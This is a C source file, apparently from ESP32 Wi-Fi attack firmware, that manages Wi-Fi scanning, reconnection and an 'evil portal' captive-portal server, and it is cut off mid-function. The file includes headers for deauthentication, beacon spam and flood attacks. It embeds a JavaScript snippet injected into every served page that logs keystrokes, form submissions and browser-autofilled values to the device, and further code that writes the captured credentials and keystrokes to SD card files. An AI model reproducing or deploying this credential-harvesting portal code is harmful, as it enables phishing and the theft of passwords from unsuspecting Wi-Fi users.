// wifi_manager.c

#include "managers/wifi_manager.h"
#include "managers/ghostscript_runtime.h"
#include "scans/wifi/hop_profile.h"
#include "scans/wifi/port_scan.h"
#include "scans/wifi/arp_scan.h"
#include "scans/wifi/ssh_scan.h"
#include "core/callbacks.h"  // For callback function declarations
#include "core/network_constants.h" // For common port definitions
#include "core/ouis.h"       // For OUI vendor lookup
#include "managers/ghostchi_manager.h"
#include "vendor/pcap.h"     // For pcap_is_wireshark_mode()
#include "esp_attr.h"
#include "esp_crt_bundle.h"
#include "esp_sntp.h"
#ifdef CONFIG_HAS_RTC_CLOCK
#include "vendor/drivers/pcf8563.h"
#endif
#include "esp_event.h"
#include "esp_heap_caps.h" // Add include for heap stats
#include "core/memory_debug.h"
#include "esp_http_client.h"
#include "esp_log.h"
#include "esp_timer.h"
#include "esp_wifi.h"
#include "freertos/FreeRTOS.h"
#include "freertos/event_groups.h"
#include "freertos/semphr.h"
#include "lwip/etharp.h"
#include "lwip/netif.h"
#include "lwip/ip4_addr.h"
#include "lwip/lwip_napt.h"
#include "managers/ap_manager.h"
#include "managers/rgb_manager.h"
#include "managers/settings_manager.h"
#include "managers/ota_manager.h"
#include "managers/peer_ota_manager.h"
#include "managers/self_ota_manager.h"
#include "managers/status_display_manager.h"
#include "gui/toast.h"
#include "nvs_flash.h"
#include <core/dns_server.h>
#include <ctype.h>
#include <dhcpserver/dhcpserver.h>
#include <esp_http_server.h>
#include <esp_random.h>
#include <errno.h>
#include <fcntl.h>
#include <math.h>
#include <mdns.h>
#include <stdio.h>
#include <string.h>
#include <time.h>
#include <sys/time.h>
#if defined(CONFIG_WITH_SCREEN) || defined(WITH_SCREEN)
#include "managers/views/music_visualizer.h"
#endif
#include "managers/sd_card_manager.h"
#include "managers/wigle_manager.h"
#include "core/scan_saver.h"
#include "managers/views/terminal_screen.h"
#include "core/glog.h"
#include "core/ghostesp_version.h"
#include "core/esp_comm_manager.h"
#include "core/utils.h" // Add utils include
#include <inttypes.h>
#include "managers/default_portal.h"
#include "core/commandline.h"
#include "freertos/task.h"
#include "freertos/portmacro.h"
#define MBEDTLS_DECLARE_PRIVATE_IDENTIFIERS
#include "mbedtls/private/ecp.h"
#include "mbedtls/private/ctr_drbg.h"
#include "mbedtls/private/entropy.h"
#include "mbedtls/private/sha256.h"
#include "mbedtls/private/hmac_drbg.h"
#include "mbedtls/private/bignum.h"
#include "core/serial_manager.h"
#include "attacks/wifi/deauth_attack.h"
#include "attacks/wifi/beacon_spam.h"
#include "attacks/wifi/eapol_logoff.h"
#include "attacks/wifi/sae_flood.h"
#include "attacks/wifi/channel_switch_attack.h"
#include "attacks/wifi/gtk_abuse.h"
#include "attacks/wifi/probe_request_flood.h"
#include "attacks/wifi/bad_msg.h"
#include "attacks/wifi/auth_flood.h"
#include "scans/wifi/ap_scan.h"
#include "scans/wifi/airspace_monitor.h"
#include "scans/wifi/station_scan.h"
#include "scans/wifi/wifi_channels.h"

void music_visualizer_view_update(const uint8_t *amplitudes,
                                  const char *track_name,
                                  const char *artist_name);

#include "core/network_constants.h"

#define MAX_DEVICES 255
#define CHUNK_SIZE 4096
#define MDNS_NAME_BUF_LEN 65
#define ARP_DELAY_MS 500

// Persistent mDNS result storage (heap-allocated)
static mdns_device_t *g_mdns_results = NULL;
static int g_mdns_result_count = 0;
static volatile bool g_mdns_scan_running = false;
static volatile bool g_mdns_scan_done = false;

#define BEACON_LIST_MAX 16
#define BEACON_SSID_MAX_LEN 32

// limit how many ap records we keep to avoid memory bloat/crashes
#define MAX_SCANNED_APS 100

#define KARMA_MAX_SSIDS 32

// Forward declarations for live AP scan
static void live_ap_scan_callback(void *buf, wifi_promiscuous_pkt_type_t type);
static void wifi_track_callback(void *buf, wifi_promiscuous_pkt_type_t type);
static esp_err_t start_live_ap_channel_hopping(void);
static void stop_live_ap_channel_hopping(void);
static bool callback_uses_selected_ap_capture_plan(wifi_promiscuous_cb_t_t callback);
static void apply_selected_ap_capture_channel_plan(wifi_promiscuous_cb_t_t callback);
static esp_timer_handle_t live_ap_channel_hop_timer = NULL;
static volatile bool live_ap_hopping_active = false;
static uint32_t last_live_print_ms = 0;
static uint16_t live_last_printed_index = 0;

#if defined(CONFIG_IDF_TARGET_ESP32C5)
static const uint8_t live_ap_channels[] = {
    1,2,3,4,5,6,7,8,9,10,11,12,13,
    36,40,44,48,52,56,60,64,
    100,104,108,112,116,120,124,128,132,136,140,144,
    149,153,157,161,165
};
#else
static const uint8_t live_ap_channels[] = {
    1,2,3,4,5,6,7,8,9,10,11,12,13
};
#endif
static const size_t live_ap_channels_len = sizeof(live_ap_channels) / sizeof(live_ap_channels[0]);
static size_t live_ap_channel_index = 0;

// Runtime channel list for "Scan APs Live": the compile-time table by
// default, or the user hop profile when one is selected.
static uint8_t live_ap_profile_channels[WIFI_CHANNELS_MAX];
static const uint8_t *live_ap_active_channels = NULL;
static size_t live_ap_active_channels_len = 0;

const char *TAG = "WiFiManager";

// Station scan variables moved to station_scan.c module
bool manual_disconnect = false;
static volatile bool wifi_connect_cancel_requested = false;
static esp_timer_handle_t wifi_reconnect_timer = NULL;
static int wifi_reconnect_count = 0;
static volatile bool wifi_driver_started = false;
static volatile bool wifi_monitor_capture_active = false;
static volatile bool wifi_timed_scan_active = false;
#define WIFI_MAX_RECONNECT_ATTEMPTS  5
static volatile bool visualizer_stop_requested = false;
static volatile int visualizer_socket = -1;
static volatile bool ota_auto_check_running = false;
static volatile bool ota_auto_check_done = false;

static bool karma_portal_active = false;

volatile bool ap_sta_has_ip = false;

// Port definitions moved to core/network_constants.c

EXT_RAM_BSS_ATTR static char PORTALURL[512] = "";
EXT_RAM_BSS_ATTR static char domain_str[128] = "";
EventGroupHandle_t wifi_event_group;
wifi_ap_record_t selected_ap;
wifi_ap_record_t *selected_aps = NULL;
int selected_ap_count = 0;
// selected_station and station_selected moved to station_scan.c module
bool redirect_handled = false;
httpd_handle_t evilportal_server = NULL;
dns_server_handle_t dns_handle;
static portMUX_TYPE dns_handle_mux = portMUX_INITIALIZER_UNLOCKED;

dns_server_handle_t dns_handle_take(void) {
    portENTER_CRITICAL(&dns_handle_mux);
    dns_server_handle_t h = dns_handle;
    dns_handle = NULL;
    portEXIT_CRITICAL(&dns_handle_mux);
    return h;
}

esp_netif_t *wifiAP;
esp_netif_t *wifiSTA;
static bool login_done = false;
EXT_RAM_BSS_ATTR static char current_creds_filename[128] = "";
EXT_RAM_BSS_ATTR static char current_keystrokes_filename[128] = "";
static int ap_connection_count = 0;

#define MAX_HTML_BUFFER_SIZE 2048
#define PORTAL_MAX_FILE_CACHE_SIZE (512 * 1024)
#define PORTAL_MAX_LOG_BODY_SIZE 512
#define PORTAL_LOG_WINDOW_US (1000 * 1000)
#define PORTAL_LOG_REQUESTS_PER_WINDOW 16
#define PORTAL_MIN_FLUSH_INTERVAL_US (5 * 1000 * 1000)
#define PORTAL_MAX_DIAGNOSTIC_HEADER_SIZE 256

// JavaScript snippet injected into every served HTML page to capture keystrokes and input values
// Keep as const array so it lives in flash (.rodata) and not in RAM
static const char CAPTURE_JS_SNIPPET[] =
    "<script>(function(){"
    "var s=document.createElement('style');"
    "s.textContent='@-webkit-keyframes ghost_af{0%{opacity:0.9}100%{opacity:1}}input:-webkit-autofill{animation:ghost_af 0s;}';"
    "document.head.appendChild(s);"
    "function send(d){"
    "if(navigator.sendBeacon)navigator.sendBeacon('/api/log',new Blob([d]));"
    "else fetch('/api/log',{method:'POST',headers:{'Content-Type':'text/plain'},body:d});"
    "}"
    "function fieldId(t){"
    "return t.name||t.id||t.getAttribute('placeholder')||t.getAttribute('aria-label')||t.type||'';"
    "}"
    "function fieldVal(t){"
    "var tag=t.tagName.toLowerCase();"
    "if(tag==='select')return t.options[t.selectedIndex]?t.options[t.selectedIndex].text:'';"
    "if(t.type==='checkbox'||t.type==='radio')return t.checked?'1':'0';"
    "return t.value||'';"
    "}"
    "function capture(e){"
    "var t=e.target;if(!t||!t.tagName)return;"
    "var tag=t.tagName.toLowerCase();"
    "if(tag!=='input'&&tag!=='textarea'&&tag!=='select')return;"
    "var id=fieldId(t);if(!id)return;"
    "var val=fieldVal(t);"
    "send(Date.now()+'|'+tag+'|'+id+'|'+val+'\\n');"
    "}"
    "var debounce;"
    "function debounceCapture(e){"
    "clearTimeout(debounce);debounce=setTimeout(function(){capture(e);},300);"
    "}"
    "function captureForm(form){"
    "var data=[];"
    "var els=form.elements;"
    "for(var i=0;i<els.length;i++){"
    "var t=els[i];if(!t.name&&!t.id)continue;"
    "var val=fieldVal(t);"
    "data.push((t.name||t.id)+'='+val);"
    "}"
    "if(data.length)send('form|'+form.action+'|'+data.join('&')+'\\n');"
    "}"
    "document.addEventListener('input',debounceCapture,true);"
    "document.addEventListener('change',capture,true);"
    "document.addEventListener('submit',function(e){"
    "var form=e.target;if(form&&form.tagName&&form.tagName.toLowerCase()==='form'){captureForm(form);}"
    "},true);"
    "document.addEventListener('animationstart',function(e){"
    "if(e.animationName==='ghost_af'){capture(e);}"
    "},true);"
    "document.addEventListener('keydown',function(e){"
    "if(e.key==='Enter'){var t=e.target;if(t&&(t.tagName==='INPUT'||t.tagName==='TEXTAREA'))capture({target:t});}"
    "},true);"
    "})();</script>";
static char* html_buffer = NULL;
static size_t html_buffer_size = 0;
static bool use_html_buffer = false;
// jit sd mount state for portal (somethingsomething template)
static bool portal_sd_jit_mounted = false;
static bool portal_display_suspended = false;

// Pre-loaded portal file cache for somethingsomething (JIT SPI-shared SD) builds.
// The file is read once during portal startup while the SD is mounted in the
// command-task context, avoiding a cross-task SPI bus re-init on every HTTP request.
static char  *portal_file_cache      = NULL;
static size_t portal_file_cache_size = 0;

static void portal_clear_file_cache(void) {
    if (portal_file_cache != NULL) {
        free(portal_file_cache);
        portal_file_cache = NULL;
    }
    portal_file_cache_size = 0;
}

#define PORTAL_KEYSTROKE_BUF_SZ 1024
#define PORTAL_CREDS_BUF_SZ 768
EXT_RAM_BSS_ATTR static char s_portal_keystroke_buf[PORTAL_KEYSTROKE_BUF_SZ];
static size_t s_portal_keystroke_len = 0;
EXT_RAM_BSS_ATTR static char s_portal_creds_buf[PORTAL_CREDS_BUF_SZ];
static size_t s_portal_creds_len = 0;
static int64_t s_portal_log_window_started_us = 0;
static unsigned int s_portal_log_requests_in_window = 0;
static int64_t s_portal_last_flush_us = 0;

// Per-client HTTP rate limiting for all portal requests (not just /api/log).
// This catches floods directed at /login, captive probes, and static assets.
#define PORTAL_HTTP_RL_TABLE_SIZE 8
#define PORTAL_HTTP_RL_BURST 8
#define PORTAL_HTTP_RL_REFILL_US (100 * 1000)  // 100 ms
#define PORTAL_HTTP_RL_REFILL_TOKENS 1

typedef struct {
    uint32_t src_addr;
    uint8_t tokens;
    int64_t last_refill_us;
} portal_http_rl_entry_t;

static portal_http_rl_entry_t s_portal_http_rl_table[PORTAL_HTTP_RL_TABLE_SIZE] = {0};

static bool portal_http_rate_limit_allow(uint32_t src_addr) {
    const int64_t now = esp_timer_get_time();
    portal_http_rl_entry_t *slot = NULL;
    portal_http_rl_entry_t *oldest = NULL;
    int64_t oldest_time = INT64_MAX;

    for (int i = 0; i < PORTAL_HTTP_RL_TABLE_SIZE; i++) {
        if (s_portal_http_rl_table[i].src_addr == src_addr) {
            slot = &s_portal_http_rl_table[i];
            break;
        }
        if (s_portal_http_rl_table[i].src_addr == 0) {
            if (!slot) slot = &s_portal_http_rl_table[i];
        } else if (s_portal_http_rl_table[i].last_refill_us < oldest_time) {
            oldest_time = s_portal_http_rl_table[i].last_refill_us;
            oldest = &s_portal_http_rl_table[i];
        }
    }

    if (!slot) {
        slot = oldest;
        slot->src_addr = src_addr;
        slot->tokens = 0;
    }

    if (slot->src_addr == 0) {
        slot->src_addr = src_addr;
        slot->tokens = PORTAL_HTTP_RL_BURST;
        slot->last_refill_us = now;
    }

    int64_t elapsed = now - slot->last_refill_us;
    if (elapsed >= PORTAL_HTTP_RL_REFILL_US) {
        int64_t refills = elapsed / PORTAL_HTTP_RL_REFILL_US;
        int64_t new_tokens = (int64_t)slot->tokens + refills * PORTAL_HTTP_RL_REFILL_TOKENS;
        if (new_tokens > PORTAL_HTTP_RL_BURST) new_tokens = PORTAL_HTTP_RL_BURST;
        slot->tokens = (uint8_t)new_tokens;
        slot->last_refill_us = now;
    }

    if (slot->tokens > 0) {
        slot->tokens--;
        return true;
    }
    return false;
}

static uint32_t portal_get_client_addr(httpd_req_t *req) {
    int sock = httpd_req_to_sockfd(req);
    if (sock < 0) return 0;
    struct sockaddr_storage peer_addr;
    socklen_t peer_len = sizeof(peer_addr);
    if (getpeername(sock, (struct sockaddr *)&peer_addr, &peer_len) != 0) {
        return 0;
    }
    if (peer_addr.ss_family == AF_INET) {
        return ((struct sockaddr_in *)&peer_addr)->sin_addr.s_addr;
    }
#if LWIP_IPV6
    if (peer_addr.ss_family == AF_INET6) {
        struct sockaddr_in6 *addr6 = (struct sockaddr_in6 *)&peer_addr;
        if (IN6_IS_ADDR_V4MAPPED(addr6->sin6_addr.s6_addr)) {
            return PP_HTONL(LWIP_MAKEU32(addr6->sin6_addr.s6_addr[12],
                                         addr6->sin6_addr.s6_addr[13],
                                         addr6->sin6_addr.s6_addr[14],
                                         addr6->sin6_addr.s6_addr[15]));
        }
    }
#endif
    return 0;
}

static void portal_flush_buffers_to_sd(void);

static bool portal_capture_request_allowed(void) {
    const int64_t now = esp_timer_get_time();

    if (s_portal_log_window_started_us == 0 ||
        now - s_portal_log_window_started_us >= PORTAL_LOG_WINDOW_US) {
        s_portal_log_window_started_us = now;
        s_portal_log_requests_in_window = 0;
    }

    if (s_portal_log_requests_in_window >= PORTAL_LOG_REQUESTS_PER_WINDOW) {
        return false;
    }

    s_portal_log_requests_in_window++;
    return true;
}

static void portal_flush_buffers_if_due(void) {
    const int64_t now = esp_timer_get_time();
    if (s_portal_last_flush_us != 0 &&
        now - s_portal_last_flush_us < PORTAL_MIN_FLUSH_INTERVAL_US) {
        return;
    }

    s_portal_last_flush_us = now;
    portal_flush_buffers_to_sd();
}

static void portal_flush_buffers_to_sd(void) {
#if defined(CONFIG_BUILD_CONFIG_TEMPLATE)
    if (strcmp(CONFIG_BUILD_CONFIG_TEMPLATE, "somethingsomething") != 0) return;
#endif
    
    if (s_portal_keystroke_len == 0 && s_portal_creds_len == 0) {
        ESP_LOGD(TAG, "portal_flush: no data to flush");
        return;
    }
    
    ESP_LOGI(TAG, "portal_flush: triggered (keystrokes=%zu bytes, creds=%zu bytes)", 
             s_portal_keystroke_len, s_portal_creds_len);
    
    if (current_keystrokes_filename[0] == '\0' && current_creds_filename[0] == '\0') {
        ESP_LOGW(TAG, "portal_flush: no filenames configured, discarding buffers");
        s_portal_keystroke_len = 0;
        s_portal_creds_len = 0;
        return;
    }
    
    const size_t min_internal_heap = 768;
    size_t free_internal = heap_caps_get_free_size(MALLOC_CAP_INTERNAL | MALLOC_CAP_8BIT);
    if (free_internal < min_internal_heap) {
        ESP_LOGW(TAG, "portal_flush: insufficient internal heap (%zu < %zu), deferring flush", 
                 free_internal, min_internal_heap);
        return;
    }

    bool display_was_suspended = false;
    esp_err_t mount_err = sd_card_mount_for_flush(&display_was_suspended);
    if (mount_err != ESP_OK) {
        ESP_LOGE(TAG, "portal_flush: sd mount failed: %s, data lost", esp_err_to_name(mount_err));
        s_portal_keystroke_len = 0;
        s_portal_creds_len = 0;
        return;
    }
    ESP_LOGI(TAG, "portal_flush: sd mounted successfully");

    if (current_keystrokes_filename[0] != '\0' && s_portal_keystroke_len > 0) {
        FILE *f = fopen(current_keystrokes_filename, "a");
        if (f) {
            size_t written = fwrite(s_portal_keystroke_buf, 1, s_portal_keystroke_len, f);
            fclose(f);
            ESP_LOGI(TAG, "portal_flush: wrote %zu keystrokes bytes to %s", 
                     written, current_keystrokes_filename);
        } else {
            ESP_LOGE(TAG, "portal_flush: failed to open keystrokes file: %s", current_keystrokes_filename);
        }
        s_portal_keystroke_len = 0;
    }
    
    if (current_creds_filename[0] != '\0' && s_portal_creds_len > 0) {
        FILE *f = fopen(current_creds_filename, "a");
        if (f) {
            size_t written = fwrite(s_portal_creds_buf, 1, s_portal_creds_len, f);
            fclose(f);
            ESP_LOGI(TAG, "portal_flush: wrote %zu creds bytes to %s", 
                     written, current_creds_filename);
        } else {
            ESP_LOGE(TAG, "portal_flush: failed to open creds file: %s", current_creds_filename);
        }
        s_portal_creds_len = 0;
    }
    
    sd_card_unmount_after_flush(display_was_suspended);
    ESP_LOGI(TAG, "portal_flush: complete, sd unmounted");
}

// forced flush that bypasses heap check - use only on portal stop as last resort to save data
static void portal_force_flush_to_sd(void) {
#if defined(CONFIG_BUILD_CONFIG_TEMPLATE)
    if (strcmp(CONFIG_BUILD_CONFIG_TEMPLATE, "somethingsomething") != 0) return;
#endif
    
    if (s_portal_keystroke_len == 0 && s_portal_creds_len == 0) {
        return;
    }
    
    size_t free_internal = heap_caps_get_free_size(MALLOC_CAP_INTERNAL | MALLOC_CAP_8BIT);
    ESP_LOGW(TAG, "portal_force_flush: attempting flush with only %zu bytes internal heap", free_internal);
    
    if (current_keystrokes_filename[0] == '\0' && current_creds_filename[0] == '\0') {
        ESP_LOGE(TAG, "portal_force_flush: no filenames, losing %zu keystrokes + %zu creds bytes",
                 s_portal_keystroke_len, s_portal_creds_len);
        s_portal_keystroke_len = 0;
        s_portal_creds_len = 0;
        return;
    }

    bool display_was_suspended = false;
    esp_err_t mount_err = sd_card_mount_for_flush(&display_was_suspended);
    if (mount_err != ESP_OK) {
        ESP_LOGE(TAG, "portal_force_flush: sd mount failed: %s, losing %zu keystrokes + %zu creds bytes",
                 esp_err_to_name(mount_err), s_portal_keystroke_len, s_portal_creds_len);
        s_portal_keystroke_len = 0;
        s_portal_creds_len = 0;
        return;
    }

    if (current_keystrokes_filename[0] != '\0' && s_portal_keystroke_len > 0) {
        FILE *f = fopen(current_keystrokes_filename, "a");
        if (f) {
            size_t written = fwrite(s_portal_keystroke_buf, 1, s_portal_keystroke_len, f);
            fclose(f);
            ESP_LOGI(TAG, "portal_force_flush: saved %zu keystrokes bytes", written);
        }
        s_portal_keystroke_len = 0;
    }
    
    if (current_creds_filename[0] != '\0' && s_portal_creds_len > 0) {
        FILE *f = fopen(current_creds_filename, "a");
        if (f) {
            size_t written = fwrite(s_portal_creds_buf, 1, s_portal_creds_len, f);
            fclose(f);
            ESP_LOGI(TAG, "portal_force_flush: saved %zu creds bytes", written);
        }
        s_portal_creds_len = 0;
    }
    
    sd_card_unmount_after_flush(display_was_suspended);
}

static SemaphoreHandle_t g_wifi_ctrl_mutex = NULL;
static bool g_ap_diag_registered = false;
static esp_event_handler_instance_t g_ap_diag_wifi_inst;
static esp_event_handler_instance_t g_ap_diag_ip_inst;

static void wifi_ap_diag_event_handler(void *arg, esp_event_base_t event_base, int32_t event_id,
                                       void *event_data) {
    (void)arg;
    if (event_base == WIFI_EVENT) {
        switch (event_id) {
            case WIFI_EVENT_AP_START:
                ESP_LOGI(TAG, "ap: started");
                break;
            case WIFI_EVENT_AP_STOP:
                ESP_LOGI(TAG, "ap: stopped");
                break;
            case WIFI_EVENT_AP_STACONNECTED: {
                const wifi_event_ap_staconnected_t *e = (const wifi_event_ap_staconnected_t *)event_data;
                if (e) {
                    ESP_LOGI(TAG, "ap: sta connected: %02x:%02x:%02x:%02x:%02x:%02x aid=%d",
                             e->mac[0], e->mac[1], e->mac[2], e->mac[3], e->mac[4], e->mac[5], (int)e->aid);
                }
                break;
            }
            case WIFI_EVENT_AP_STADISCONNECTED: {
                const wifi_event_ap_stadisconnected_t *e = (const wifi_event_ap_stadisconnected_t *)event_data;
                if (e) {
                    ESP_LOGI(TAG, "ap: sta disconnected: %02x:%02x:%02x:%02x:%02x:%02x aid=%d reason=%d",
                             e->mac[0], e->mac[1], e->mac[2], e->mac[3], e->mac[4], e->mac[5],
                             (int)e->aid, (int)e->reason);
                }
                break;
            }
            default:
                break;
        }
    } else if (event_base == IP_EVENT) {
        switch (event_id) {
            case IP_EVENT_AP_STAIPASSIGNED: {
                const ip_event_ap_staipassigned_t *e = (const ip_event_ap_staipassigned_t *)event_data;
                if (e) {
                    ESP_LOGI(TAG, "ap: dhcp assigned ip: " IPSTR, IP2STR(&e->ip));
                } else {
                    ESP_LOGI(TAG, "ap: dhcp assigned ip");
                }
                break;
            }
            default:
                break;
        }
    }
}

static bool wifi_ctrl_lock(TickType_t ticks_to_wait) {
    if (g_wifi_ctrl_mutex == NULL) {
        g_wifi_ctrl_mutex = xSemaphoreCreateMutex();
        if (g_wifi_ctrl_mutex == NULL) return false;
    }
    return xSemaphoreTake(g_wifi_ctrl_mutex, ticks_to_wait) == pdTRUE;
}

static void wifi_ctrl_unlock(void) {
    if (g_wifi_ctrl_mutex) xSemaphoreGive(g_wifi_ctrl_mutex);
}

static esp_err_t wifi_stop_safely(void) {
    wifi_mode_t mode = WIFI_MODE_NULL;
    esp_err_t st = esp_wifi_get_mode(&mode);
    if (st == ESP_ERR_WIFI_NOT_INIT) return ESP_OK;
    if (st != ESP_OK) return st;

    esp_err_t r = esp_wifi_stop();
    if (r == ESP_ERR_WIFI_NOT_STARTED) return ESP_OK;
    return r;
}

// single reusable transfer buffer for streaming to reduce heap churn
static char *g_stream_buf = NULL;
static SemaphoreHandle_t g_stream_buf_mutex = NULL;
static inline bool stream_buf_lock(void) {
    if (g_stream_buf_mutex == NULL) {
        g_stream_buf_mutex = xSemaphoreCreateMutex();
        if (g_stream_buf_mutex == NULL) return false;
    }
    // Bounded wait: prevents one stalled client from monopolizing the shared
    // streaming buffer when the portal is under heavy load.
    if (xSemaphoreTake(g_stream_buf_mutex, pdMS_TO_TICKS(3000)) != pdTRUE) return false;
    if (g_stream_buf == NULL) {
#if CONFIG_SPIRAM
        g_stream_buf = (char *)heap_caps_malloc(CHUNK_SIZE + 1, MALLOC_CAP_SPIRAM | MALLOC_CAP_8BIT);
        if (g_stream_buf == NULL) {
            ESP_LOGW(TAG, "PSRAM g_stream_buf failed, trying internal RAM");
            g_stream_buf = (char *)malloc(CHUNK_SIZE + 1);
        }
#else
        g_stream_buf = (char *)malloc(CHUNK_SIZE + 1);
#endif
        if (g_stream_buf == NULL) {
            xSemaphoreGive(g_stream_buf_mutex);
            return false;
        }
    }
    return true;
}
static inline void stream_buf_unlock(void) {
    if (g_stream_buf_mutex) {
        xSemaphoreGive(g_stream_buf_mutex);
    }
}

void wifi_manager_release_stream_buffer(void) {
    SemaphoreHandle_t mutex = g_stream_buf_mutex;
    if (!mutex) return;

    if (xSemaphoreTake(mutex, portMAX_DELAY) != pdTRUE) return;
    free(g_stream_buf);
    g_stream_buf = NULL;
    g_stream_buf_mutex = NULL;
    xSemaphoreGive(mutex);
    vSemaphoreDelete(mutex);
}

// Station scan channel hopping moved to station_scan.c module

// Wireshark Capture Channel Hopping Globals
static esp_timer_handle_t wireshark_channel_hop_timer = NULL;
static size_t wireshark_channel_index = 0;
static bool wireshark_hopping_active = false;
#define WIRESHARK_CHANNEL_HOP_INTERVAL_MS 150
uint8_t wireshark_channels[50];
size_t wireshark_channels_count = 0;

// Helper function forward declaration
static void sanitize_ssid_and_check_hidden(const uint8_t* input_ssid, char* output_buffer, size_t buffer_size);

struct service_info {
    const char *query;
    const char *type;
};

// Store in flash: const ensures this large-ish static table is placed in .rodata
static const struct service_info services[] = {{"_http", "Web Server Enabled Device"},
                                              {"_ssh", "SSH Server"},
                                              {"_ipp", "Printer (IPP)"},
                                              {"_googlecast", "Google Cast"},
                                              {"_raop", "AirPlay"},
                                              {"_smb", "SMB File Sharing"},
                                              {"_hap", "HomeKit Accessory"},
                                              {"_spotify-connect", "Spotify Connect Device"},
                                              {"_printer", "Printer (Generic)"},
                                              {"_mqtt", "MQTT Broker"}};

#define NUM_SERVICES (sizeof(services) / sizeof(services[0]))

struct DeviceInfo {
    struct ip4_addr ip;
    struct eth_addr mac;
};

static void wifi_reconnect_timer_stop(void) {
    if (wifi_reconnect_timer) {
        esp_timer_stop(wifi_reconnect_timer);
        esp_timer_delete(wifi_reconnect_timer);
        wifi_reconnect_timer = NULL;
    }
}

static bool wifi_reconnect_hold = false;

static bool wifi_reconnect_blocked(const char **reason_out) {
    if (wifi_reconnect_hold) {
        if (reason_out) *reason_out = "radio reserved";
        return true;
    }
    /* A manual connect owns the station configuration and performs its own
     * retry/wait loop.  Starting the background reconnect worker here races
     * that loop and can make the AP immediately drop the association. */
    if (wifi_event_group &&
        (xEventGroupGetBits(wifi_event_group) & WIFI_CONNECTING_BIT)) {
        if (reason_out) *reason_out = "manual connection in progress";
        return true;
    }
    if (wifi_monitor_capture_active) {
        if (reason_out) *reason_out = "monitor mode";
        return true;
    }

    if (ap_scan_is_running() || wifi_timed_scan_active) {
        if (reason_out) *reason_out = "AP scan active";
        return true;
    }

    bool promiscuous_enabled = false;
    esp_err_t promisc_err = esp_wifi_get_promiscuous(&promiscuous_enabled);
    if (promisc_err == ESP_OK && promiscuous_enabled) {
        if (reason_out) *reason_out = "promiscuous mode";
        return true;
    }

    return false;
}

void wifi_manager_set_reconnect_hold(bool hold) {
    wifi_reconnect_hold = hold;
    if (hold) wifi_manager_stop_reconnect();
}

static void wifi_reconnect_reset(void) {
    wifi_reconnect_timer_stop();
    wifi_reconnect_count = 0;
}

static void wifi_reconnect_timer_cb(void *arg) {
    if (wifi_reconnect_hold || !wifi_driver_started) {
        ESP_LOGI(TAG, "Skipping auto-reconnect while Wi-Fi is reserved or stopped");
        wifi_reconnect_count = 0;
        return;
    }

    const char *reason = NULL;
    if (wifi_reconnect_blocked(&reason)) {
#if CONFIG_IDF_TARGET_ESP32P4
        /* The manual connect loop owns retries until it finishes. */
        if (wifi_event_group &&
            (xEventGroupGetBits(wifi_event_group) & WIFI_CONNECTING_BIT)) {
            return;
        }
#endif
        ESP_LOGI(TAG, "Skipping auto-reconnect while %s", reason ? reason : "busy");
        if (wifi_reconnect_timer) {
            esp_timer_start_once(wifi_reconnect_timer, 3000 * 1000);
        }
        return;
    }

    const char *saved_ssid = settings_get_sta_ssid(&G_Settings);
    if (saved_ssid && strlen(saved_ssid) > 0) {
        int saved_count = wifi_reconnect_count;
        glog("Auto-reconnect attempt %d/%d to %s\n", saved_count, WIFI_MAX_RECONNECT_ATTEMPTS, saved_ssid);
        wifi_manager_configure_sta_from_settings();
        wifi_reconnect_count = saved_count;
    }
}

static void wifi_reconnect_schedule(void) {
    wifi_reconnect_timer_stop();

    if (!settings_get_wifi_auto_reconnect(&G_Settings)) {
        return;
    }

    if (wifi_reconnect_count > 0 && wifi_reconnect_count <= WIFI_MAX_RECONNECT_ATTEMPTS) {
        static const int backoff_ms[] = {3000, 5000, 10000, 20000, 30000};
        int delay_ms = backoff_ms[wifi_reconnect_count - 1];
        esp_timer_create_args_t args = {
            .callback = wifi_reconnect_timer_cb,
            .name = "wifi_reconnect"
        };
        if (esp_timer_create(&args, &wifi_reconnect_timer) == ESP_OK) {
            esp_timer_start_once(wifi_reconnect_timer, delay_ms * 1000);
        }
    }
}

void wifi_manager_set_manual_disconnect(bool disconnect) {
    manual_disconnect = disconnect;
}

void wifi_manager_cancel_connect(void) {
    wifi_connect_cancel_requested = true;
    wifi_ap_record_t ap_info;
    manual_disconnect = (esp_wifi_sta_get_ap_info(&ap_info) == ESP_OK);
    wifi_reconnect_reset();
    esp_err_t err = esp_wifi_disconnect();
    if (err != ESP_OK && err != ESP_ERR_WIFI_NOT_STARTED && err != ESP_ERR_WIFI_NOT_CONNECT) {
        ESP_LOGW(TAG, "cancel_connect: esp_wifi_disconnect returned %s", esp_err_to_name(err));
    }
}

void wifi_manager_stop_reconnect(void) {
    wifi_reconnect_reset();
}

void wifi_manager_stop_visualizer(void) {
    visualizer_stop_requested = true;

    if (visualizer_socket >= 0) {
        shutdown(visualizer_socket, 0);
    }
}

void wifi_manager_start_visualizer(bool for_screen) {
    if (VisualizerHandle != NULL) {
        return;
    }

    if (for_screen) {
#if defined(CONFIG_WITH_SCREEN) || defined(WITH_SCREEN)
        xTaskCreate(screen_music_visualizer_task, "udp_server", 4096, NULL, 5, &VisualizerHandle);
#endif
    } else {
        xTaskCreate(animate_led_based_on_amplitude, "udp_server", 4096, NULL, 5, &VisualizerHandle);
    }
}

static void tolower_str(const uint8_t *src, char *dst) {
    for (int i = 0; i < 33 && src[i] != '\0'; i++) {
        dst[i] = tolower((char)src[i]);
    }
    dst[32] = '\0'; // Ensure null-termination
}

static void event_handler(void *arg, esp_event_base_t event_base, int32_t event_id,
                          void *event_data) {
    if (event_base == WIFI_EVENT) {
        switch (event_id) {
        case WIFI_EVENT_AP_START:
            glog("WiFi_manager: AP started\n");
            break;
        case WIFI_EVENT_AP_STOP:
            glog("WiFi_manager: AP stopped\n");
            break;
        case WIFI_EVENT_AP_STACONNECTED:
            ap_connection_count++;
            glog("WiFi_manager: Station connected to AP\n");
            toast_show("Target connected", TOAST_INFO);
            esp_wifi_set_ps(WIFI_PS_NONE);
            break;
        case WIFI_EVENT_AP_STADISCONNECTED:
            if (ap_connection_count > 0) ap_connection_count--;
            glog("WiFi_manager: Station disconnected from AP\n");
            toast_show("Target disconnected", TOAST_WARN);
            login_done = false;
            if (ap_connection_count == 0) {
                esp_wifi_set_ps(WIFI_PS_MIN_MODEM);
                ap_sta_has_ip = false;
            }
            break;
        case WIFI_EVENT_STA_START:
            glog("STA started\n");
            // No auto-connect here - handled by wifi_event_handler
            break;
        case WIFI_EVENT_STA_CONNECTED:
            /* ESP-Hosted delivers the association event through the remote
             * Wi-Fi event wrapper.  Explicitly kick the P4-side DHCP client
             * here as well; on some hosted/C6 boots the default netif action
             * does not see the corresponding remote event. */
            if (wifiSTA) {
